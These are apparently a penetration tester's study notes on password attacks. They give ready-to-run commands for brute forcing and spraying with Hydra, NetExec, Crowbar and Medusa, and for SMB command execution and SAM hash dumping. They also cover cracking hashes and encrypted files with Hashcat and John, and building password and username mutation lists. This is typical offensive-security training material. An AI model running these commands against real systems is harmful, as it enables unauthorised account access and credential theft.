# Brute Force

#### Hydra
- `-l` is for log in name, `L` for list
- `-p` is for password, `P` for list
- `-s [PORT]` to specify non-default port for a service
- `-VV`
- `-t n` where `n` is the number of parallel connections to the target
- `-d` for debugging

Example usage
- `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>`
- `hydra -l chris -P /usr/share/wordlists/rockyou.txt [target ip] ftp`
- Common protocols:
	- `smb://`
	- `ssh://`
	- `rdp://`

#### CrackMapExec/Netexec
- password spray tool to prevent lockout
- use `--local-auth` for non-domain joined machines/users
- `netexec smb [IP] -u [list] -p [list] --local-auth`
	- You can also specify a `'string'` for user or password instead of file
	- once you brute force to find password, add `--spider [wordlist]` or `-M spider_plus`
	- add `--share [share]` 
- Can use netexec for xp_cmdshell


#### Crowbar
- https://github.com/galkan/crowbar
- can be installed with package manager
- `-b [protocol]`
- `openvpn, rdp, sshkey, vpn`
- `crowbar -b rdp -s [IP] -U users.txt -c 'password123'`
- 
#### Medusa
- `-u` user
- `-U` list
- `-P` pass list
- `-M [protocol]`
- `-h [IP]`
- `-n` specify a non-default port number


# Network Service Password Attacks

#### SMB
- netexec
- smbclient/smbenum
- enum4linux-ng
- hydra
- metasploit `auxiliary/scanner/smb/smb_login`

- NetExec (CrackMapExec)
	- `netexec -h` for help
	- `netexec [protocol] -h` for specific network service help
	- `netexec [protocol] [IP] -u [user or list] -p [password or list]`
	- if you see `Pwn3d!` in the output, you can likely execute system commands by logging in through brute force



See `Brute Force: Hydra` for more RDP, SSH, and SMB

### NetExec

Used to be crackmapexec

`netexec [protocol] [IP] -u [user/list] -p [pass/list]`


NetExec for SMB
- can list shares with smb by adding `--shares`
- can automatically download SAM db hashes by adding --sam

Using Netexec for PSExec or SMBExec (Windows)
- Can run commands on multiple hosts at a time through SMB. `-x` will do CMD prompt commands and `-X` for powershell.
- use `--exec-method smbexec` after specifying the command
- `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
- if you have addresses for multiple hosts, you can specify that IP range in the command and add `--loggedon-users` to enumerate users on other machines (You need local admin account on initial target)
- Also works with `mssql`

# Hashcat

`hashid [hash]`

Hash Identify:
- [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)
-  [https://gitlab.com/kalilinux/packages/hash-identifier.git](https://gitlab.com/kalilinux/packages/hash-identifier.git)

- `hashcat -h`
- `hashcat -a 0 -m 1800 hash.hash [wordlist]`
	- `a` is attack mode
	- `m` is hash type
	- `hash.hash` is the file containing the hash

#### Quick Hash ID Notes


| `$1$`    | MD5           |
| -------- | ------------- |
| `$2a$`   | Blowfish      |
| `$5$`    | SHA-256       |
| `$6$`    | SHA-512       |
| `$sha1$` | SHA1crypt     |
| `$y$`    | Yescrypt      |
| `$gy$`   | Gost-yescrypt |
| `$7$`    | Scrypt        |

# File Cracking

Usually uses symmetric encryption such as AES-256
Common encoded file formats to search for https://fileinfo.com/filetypes/encoded
Compressed file types https://fileinfo.com/filetypes/compressed

John
- `locate *2john*` shows all available cracking tools with John
- `something2john` procedure
	- `zip2john [zip-file] > [output.hash]`
	- `john --wordlist=[list] [output.hash]`
	- `john [cracked file] --show`if you need to view results again
- Common tools
	- `office2john`
	- `pdf2john` 
	- `zip2john`
	- `ssh2john` for private key files
	- `bitlocker2john -i` (virtual hard disk files)
		- to view decrypted vhd, you will have to mount the partition, decrypt, and mount again:
		- first https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0
		- second https://www.linuxuprising.com/2019/04/how-to-mount-bitlocker-encrypted.html
	- `keypass2john` (kdbx or other keypass database)

Cracking OpenSSL Archives
- `file [file.gzip]` to confirm openssl archive file format
- `for i in $(cat [wordlist file]);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done`

Crcaking BitLocker Drives
- `bitlocker2john -i [.vhd file] > output.hashes`
- This produces multiple hashes, the one we need is the following:
- `grep "bitlocker\$0" backup.hashes > backup.hash`
- `hashcat -m 22100 backup.hash [wordlist] -o backup.cracked` for this hash type
- `cat backup.cracked`


# User/Pass Mutations

CeWL: word scanner
- `cewl [URL] -d 4 -m 6 --lowercase -w [website.wordlist]`
	- `-d` depth to spider the website
	- `-m` minimum length of word to record
	- store in `--lowercase` for mutation purposes
	- output to a wordlist file `[name].wordlist`
	- `wc -l [wordlist]` to count how many you made

Hashcat
	- both `hashcat` and `john` have the `best64.rule` for common mutations
	- `hashcat --force [wordlist] -r [custom.rule file] --stdout | sort -u > mut_password.list` 
		- `[wordlist]` should be lowercase passwords (see CeWL above)
		- `custom.rule` is the mutation rules (see below)
		- `mut_password.list` is the output
	- `ls /usr/share/hashcat/rules/` shows rule files

Hashcat mutation syntax
	- https://hashcat.net/wiki/doku.php?id=rule_based_attack
	- `:` do nothing
	- `l` lowercase all letters
	- `u` uppercase all letters
	- `c` capitalize first letter and lowercase the rest
	- `sXY` replaces every `X` with `Y`
	- `$!` Add exclamation at the end

Credential Stuffing
- `hydra -C [user_pass.list] [protocol]://[IP]`
	- the `user_pass.list` should be formatted with items as `username:password`


Username mutation
- Consider some common business username conventions:
	- Jane Doe
	- jdoe
	- jjdoe
	- janedoe
	- jane.doe
	- doe.jane
- Try to Google domain name information to find email structure (`jdoe@email.com`)
- Use `username-anarchy` tool to create a username list (need first and last name?)
	- `username-anarchy -i [file with names] > [output]`
	- With just a name and no file: `username_anarchy [firstname] [lastname] > [output]`

